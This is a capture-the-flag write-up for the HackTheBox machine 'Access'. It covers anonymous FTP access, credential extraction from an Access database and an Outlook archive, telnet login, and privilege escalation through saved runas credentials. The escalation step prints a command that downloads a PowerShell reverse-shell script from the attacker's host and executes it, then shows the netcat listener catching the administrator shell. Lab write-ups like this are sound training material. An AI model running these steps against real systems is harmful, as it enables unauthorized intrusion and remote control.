# Access - Easy

Target IP: **10.129.82.245**

## User Flag

Initial scan: ```sudo nmap -sC -sV -p- 10.129.82.245 -v```

Output shows port 21 for FTP, port 23 for Telnet, and port 80 for http.

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet  Microsoft Windows XP telnetd
| telnet-ntlm-info: 
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
```

FTP scans show that anonymous login is enabled. Let's check it out.

After logging in, we see two directories.

```
┌──(y㉿peacebreaker)-[~/Labs/HackTheBox/Access]
└─$ ftp 10.129.82.245                                                                                             
Connected to 10.129.82.245.
220 Microsoft FTP Service
Name (10.129.82.245:y): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
425 Cannot open data connection.
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
```

Inside ```Engineer```, there is a zip file.

```
ftp> cd Engineer
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  01:16AM                10870 Access Control.zip
226 Transfer complete.
ftp> get Access\ Control.zip
local: Access Control.zip remote: Access Control.zip
200 PORT command successful.
150 Opening ASCII mode data connection.
100% |***************************************************************************************************************************| 10870      337.39 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 45 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
10870 bytes received in 00:00 (255.92 KiB/s)
```

Inside ```Backups```, there is an mdb file.

```
ftp> cd ../Backups
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************************|  5520 KiB    6.54 MiB/s    00:00 ETA
226 Transfer complete.
WARNING! 28296 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
5652480 bytes received in 00:00 (6.47 MiB/s)
```

Seems like we need a password to unzip the zip file.

```
┌──(y㉿peacebreaker)-[~/Labs/HackTheBox/Access]
└─$ 7z x Access\ Control.zip 

7-Zip 26.02 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-06-25
 64-bit locale=en_US.UTF-8 Threads:2 OPEN_MAX:4096, ASM

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed):
```

We can use ```mdbtools``` to look inside of the database file.

```
┌──(y㉿peacebreaker)-[~/Labs/HackTheBox/Access]
└─$ mdb-tables backup.mdb 
acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx 
```

The ```auth_user``` table seems interesting. Let's get the contents.

```
┌──(y㉿peacebreaker)-[~/Labs/HackTheBox/Access]
└─$ mdb-export backup.mdb auth_user
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```

Let's try the password we found to extract the zip file.

It works, and we get a ```.pst``` file.

```
┌──(y㉿peacebreaker)-[~/Labs/HackTheBox/Access]
└─$ 7z x Access\ Control.zip 

7-Zip 26.02 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-06-25
 64-bit locale=en_US.UTF-8 Threads:2 OPEN_MAX:4096, ASM

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed):
Everything is Ok

Size:       271360
Compressed: 10870
                                                                                                                                                                        
┌──(y㉿peacebreaker)-[~/Labs/HackTheBox/Access]
└─$ ls    
'Access Control.pst'  'Access Control.zip'   backup.mdb
                                                                                                                                                                        
┌──(y㉿peacebreaker)-[~/Labs/HackTheBox/Access]
└─$ file Access\ Control.pst  
Access Control.pst: Microsoft Outlook Personal Storage (>=2003, Unicode, version 23), dwReserved1=0x234, dwReserved2=0x22f3a, bidUnused=0000000000000000, dwUnique=0x39, 271360 bytes, bCryptMethod=1, CRC32 0x744a1e2e
```

Let's change this into an ```.mbox``` file.

```
┌──(y㉿peacebreaker)-[~/Labs/HackTheBox/Access]
└─$ readpst -r -u -o ~/Labs/HackTheBox/Access/ Access\ Control.pst
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.
```

Reading the output, we can see a new password.

```
┌──(y㉿peacebreaker)-[~/Labs/HackTheBox/Access/Access Control]
└─$ cat mbox               
From "john@megacorp.com" Thu Aug 23 19:44:07 2018
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
        boundary="--boundary-LibPST-iamunique-1011553636_-_-"


----boundary-LibPST-iamunique-1011553636_-_-
Content-Type: multipart/alternative;
        boundary="alt---boundary-LibPST-iamunique-1011553636_-_-"

--alt---boundary-LibPST-iamunique-1011553636_-_-
Content-Type: text/plain; charset="utf-8"

Hi there,

 

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

 

Regards,

John
```

We can authenticate with telnet as ```security```.

```
┌──(y㉿peacebreaker)-[~/Labs/HackTheBox/Access/Access Control]
└─$ telnet 10.129.82.245 23
Trying 10.129.82.245...
Connected to 10.129.82.245.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>whoami
access\security
```

We can proceed to get the user flag from here.

## Root Flag

There is an unusual directory at the root of the file system.

```
C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\

08/23/2018  11:05 PM    <DIR>          inetpub
07/14/2009  04:20 AM    <DIR>          PerfLogs
08/23/2018  09:53 PM    <DIR>          Program Files
08/24/2018  08:40 PM    <DIR>          Program Files (x86)
08/24/2018  08:39 PM    <DIR>          temp
08/21/2018  11:31 PM    <DIR>          Users
07/14/2021  02:04 PM    <DIR>          Windows
08/22/2018  08:23 AM    <DIR>          ZKTeco
               0 File(s)              0 bytes
               8 Dir(s)   3,346,747,392 bytes free
```

ZKAcess 3.5 is probably running on the machine.

```
C:\ZKTeco>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\ZKTeco

08/22/2018  08:23 AM    <DIR>          .
08/22/2018  08:23 AM    <DIR>          ..
08/23/2018  11:56 PM    <DIR>          ZKAccess3.5
               0 File(s)              0 bytes
               3 Dir(s)   3,346,747,392 bytes free
```

In the ```Public``` user's desktop, there is an ```.lnk``` file for the same application.

```
C:\Users\Public\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\Public\Desktop

08/22/2018  10:18 PM             1,870 ZKAccess3.5 Security System.lnk
               1 File(s)          1,870 bytes
               0 Dir(s)   3,346,747,392 bytes free
```

Let's try to view its contents.

```
ZKAccess3.5 Security System.lnk


L�F�@ ��7���7���#�P/P�O� �:i�+00�/C:\R1M�:Windows���:�▒M�:*wWindowsV1MV�System32���:�▒MV�*�System32▒X2P�:�
                                                                                                           runas.exe���:1��:1�*Yrunas.exe▒L-K��E�C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%�
                                                                                                               �wN�▒�]N�D.��Q���`�Xaccess�_���8{E�3
                                                                                                                                                   O�j)�H���
                                                                                                                                                            )ΰ[�_���8{E�3
 O�j)�H���
          )ΰ[�  ��1SPS��XF�L8C���&�m�e*S-1-5-21-953262931-566350628-63446256-500
```

It looks like ```runas.exe``` is called with a saved credential for ```administrator```.

Indeed, we can see that the credentials are saved.

```
C:\Users\Public\Desktop>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```

We can transfer a powershell reverse shell script and run it as ```administrator``` simultaneously with IEX.

After hosting a reverse shell script on our attack box, we can send this command to download and run it with elevated privileges with the saved credentials.

```
C:\Users\Public\Desktop>runas /savecred /user:ACCESS\Administrator "powershell -c iex (New-Object Net.WebClient).DownloadString('http://10.10.16.68:8000/shell.ps1')"
```

And we get a shell as ```administrator```.

```
┌──(y㉿peacebreaker)-[~]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.68] from (UNKNOWN) [10.129.82.245] 49158
SHELL> whoami
access\administrator
```

We can proceed to get the root flag from here.

Nice pwn!

## Contact

Email: <johnyang4406@gmail.com>, <john_s_yang@brown.edu>

LinkedIn: <https://www.linkedin.com/in/john-yang-747726292/>

HackTheBox: <https://profile.hackthebox.com/profile/019c423f-9b9b-708f-8b31-55983b89dddd?utm_medium=copy_url/>
